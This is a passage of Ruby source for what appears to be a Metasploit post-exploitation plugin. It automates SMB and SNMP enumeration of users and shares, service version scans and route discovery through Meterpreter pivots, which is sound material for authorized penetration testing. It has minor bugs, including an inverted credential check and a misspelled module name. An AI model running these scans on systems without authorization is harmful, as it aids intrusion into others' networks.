				{"mod" => "scanner/smb/smb_enumusers", "opt" => nil},
				{"mod" => "scanner/smb/smb_enumshares", "opt" => nil},
			]
			smb_mods.each do |p|
				m = framework.auxiliary.create(p["mod"])
				services.each do |s|
					if s.port == 445
						m.datastore['RHOSTS'] = s.host.address
						if not user.nil? and pass.nil?
							m.datastore['SMBUser'] = user
							m.datastore['SMBPass'] = pass
							m.datastore['SMBDomain'] = dom
						end
						m.options.validate(m.datastore)
						print_status("Running #{p['mod']} against #{s.host.address}")
						m.run_simple(
							'LocalInput'	=> driver.input,
							'LocalOutput'	=> driver.output
						)
					end

				end
			end
		end

		def run_version_scans(services)
			# Run version scan by identified services
			services.each do |s|
				if (s.port == 135) and s.info.nil?
					opts = {'RHOSTS' => s.host.address}
					run_aux_module("scanner/netbios/nbname_probe",opts)

				elsif (s.name == "http" || s.port == 80) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/http/http_version",opts)

				elsif (s.port == 1720) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/h323/h323_version",opts)

				elsif (s.name == "https" || s.port == 443) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port, 'SSL' => true}
					run_aux_module("scanner/http/http_version",opts)

				elsif (s.name == "ftp" || s.port == 21) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/ftp/ftp_version",opts)

				elsif (s.name == "telnet" || s.port == 23) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/telnet/telnet_version",opts)
					run_aux_module("scanner/telnet/telnet_encrypt_overflow",opts)

				elsif (s.name == "ssh" || s.port == 22) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/ssh/ssh_version",opts)

				elsif (s.name == "smtp" || s.port.to_s =~/25|465|587/) and s.info.nil?
					if s.port == 465
						opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port, 'SSL' => true}
					else
						opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					end
					run_aux_module("scanner/smtp/smtp_version",opts)

				elsif (s.name == "pop3" || s.port.to_s =~/110|995/) and s.info.nil?
					if s.port == 995
						opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port, 'SSL' => true}
					else
						opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					end
					run_aux_module("scanner/pop3/pop3_version",opts)

				elsif (s.name == "imap" || s.port.to_s =~/143|993/) and s.info.nil?
					if s.port == 993
						opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port, 'SSL' => true}
					else
						opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					end
					run_aux_module("scanner/imap/imap_version",opts)

				elsif (s.name == "mssql" || s.port == 1433) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/mssql/mssql_versione",opts)

				elsif (s.name == "postgres" || s.port.to_s =~/5432|5433/) and s.info.nil?
					opts = {'RHOSTS' => s.host.address,'RPORT' => s.port}
					run_aux_module("scanner/postgres/postgres_version",opts)

				elsif (s.name == "mysql" || s.port == 3306) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/mysql/mysql_version",opts)

				elsif (s.name =~ /h323/ || s.port == 1720) and s.info.nil?
					opts = {'RHOSTS' => s.host.address, 'RPORT' => s.port}
					run_aux_module("scanner/h323/h323_version",opts)

				elsif (s.port == 1521) and s.info.nil?
					opts = {'RHOSTS' => s.host.address,'RPORT' => s.port}
					run_aux_module("scanner/oracle/tnslsnr_version",opts)

				elsif (s.port.to_s =~ /50000|50001|50002/) and s.info.nil?
					opts = {'RHOSTS' => s.host.address,'RPORT' => s.port}
					run_aux_module("scanner/db2/db2_version",opts)

               elsif (s.port == 161 and s.proto == "udp") || (s.name =~/snmp/)
					opts = {'RHOSTS' => s.host.address,'RPORT' => s.port}
					run_aux_module("scanner/snmp/snmp_login",opts)
                    if s.creds.length > 0
                        s.creds.each do |c|
                            opts = {
                                'RHOSTS' => s.host.address,
                                'RPORT' => s.port,
                                'VERSION' => "1",
                                'COMMUNITY' => c.pass
                                }
                            run_aux_module("scanner/snmp/snmp_enum",opts)

                            opts = {
                                'RHOSTS' => s.host.address,
                                'RPORT' => s.port,
                                'VERSION' => "2c",
                                'COMMUNITY' => c.pass
                                }
                            run_aux_module("scanner/snmp/snmp_enum",opts)

                            if s.host.os_name =~ /windows/i
                                opts = {
                                'RHOSTS' => s.host.address,
                                'RPORT' => s.port,
                                'VERSION' => "1",
                                'COMMUNITY' => c.pass
                                }
                                run_aux_module("scanner/snmp/snmp_enumusers",opts)

                                opts = {
                                'RHOSTS' => s.host.address,
                                'RPORT' => s.port,
                                'VERSION' => "2c",
                                'COMMUNITY' => c.pass
                                }
                                run_aux_module("scanner/snmp/snmp_enumusers",opts)

                                opts = {
                                'RHOSTS' => s.host.address,
                                'RPORT' => s.port,
                                'VERSION' => "1",
                                'COMMUNITY' => c.pass
                                }
                                run_aux_module("scanner/snmp/snmp_enumshares",opts)

                                opts = {
                                'RHOSTS' => s.host.address,
                                'RPORT' => s.port,
                                'VERSION' => "2c",
                                'COMMUNITY' => c.pass
                                }
                                run_aux_module("scanner/snmp/snmp_enumshares",opts)
                            end
                        end
                    end
				end
			end
		end

		# Get a list of IP's that are routed thru a Meterpreter sessions
		# Note: This one bit me hard!! in testing. Make sure that the proper module is ran against
		# the proper host
		def get_routed_ips
			routed_ips = []
			pivot = Rex::Socket::SwitchBoard.instance
			if pivot.routes
				pivot.routes.each do |r|
					sn = r.subnet
					nm = r.netmask
					cidr = Rex::Socket.addr_atoc(nm)
					pivot_ip_range = Rex::Socket::RangeWalker.new("#{sn}/#{cidr}")
					pivot_ip_range.each do |i|
						routed_ips << i
					end
				end
			end
			return routed_ips
		end

		# Method for running auxiliary modules given the module name and options in a hash
		def run_aux_module(mod,opts)
			print_status("Running module #{mod}")
			m = framework.auxiliary.create(mod)
			opts.each do |o,v|
				m.datastore[o] = v
			end
			m.options.validate(m.datastore)
			print_status("Running #{mod}")
			m.run_simple(
				'LocalInput'	=> driver.input,
				'LocalOutput'	=> driver.output
			)
		end
	end

	def initialize(framework, opts)
		super
		if framework.db and framework.db.active
			add_console_dispatcher(PostautoCommandDispatcher)
			add_console_dispatcher(ProjectCommandDispatcher)
			add_console_dispatcher(DiscoveryCommandDispatcher)
			archive_path =  ::File.join(Msf::Config.log_directory,"archives")
			project_paths = ::File.join(Msf::Config.log_directory,"projects")

			# Create project folder if first run
			if not ::File.directory?(project_paths)
				::FileUtils.mkdir_p(project_paths)
			end

			# Create archive folder if first run
			if not ::File.directory?(archive_path)
				::FileUtils.mkdir_p(archive_path)
			end
			print_line "postauto plugin loaded."
		else
			print_error("This plugin requires the framework to be connected to a Database!")
		end
	end

	def cleanup
		remove_console_dispatcher('Postauto')
		remove_console_dispatcher('Project')
		remove_console_dispatcher('Discovery')
	end

	def name
		"pentest"
	end

	def desc
		"Plugin for Post-Exploitation automation."
	end
protected
end
end
